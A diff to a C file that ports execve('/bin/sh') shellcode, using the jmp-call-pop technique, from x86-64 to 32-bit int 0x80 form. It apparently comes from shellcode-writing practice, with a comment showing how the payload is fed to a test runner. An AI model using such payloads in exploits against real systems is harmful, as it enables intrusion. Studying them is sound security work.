@@ -27,20 +27,21 @@
  * ((cat shellcode | xxd -r -p) ; cat) | ./run
 */
 
-
+//movb $0xb, %al               \n\  ;Number of the execve(2) syscall
+//int 0x80                       \n\ ;Execute the syscall
 int main(int argc, char **argv)
 {
 	asm("\
-		shell_begin:                  \n\
-		jmp transfer                  \n\
-		code: pop %rdi                \n\
-		xor %rax, %rax                \n\
-		movb $0x3b, %al               \n\
-		xor %rsi, %rsi                \n\
-		xor %rdx, %rdx                \n\
-		syscall                       \n\
-		transfer: call code           \n\
-		.string \"/bin/sh\"           \n\
-		shell_end: .octa 0xdeadbeef   \n\
+		shell_begin:                 \n\
+		jmp transfer                 \n\
+		code: pop %ebx               \n\
+		xor %eax, %eax               \n\
+		movb $0xb, %al               \n\
+		xor %ecx, %ecx               \n\
+		xor %edx, %edx               \n\
+		int $0x80                    \n\
+		transfer: call code          \n\
+		.string \"/bin/sh\"          \n\
+		shell_end: .octa 0xdeadbeef  \n\
 	");
 }
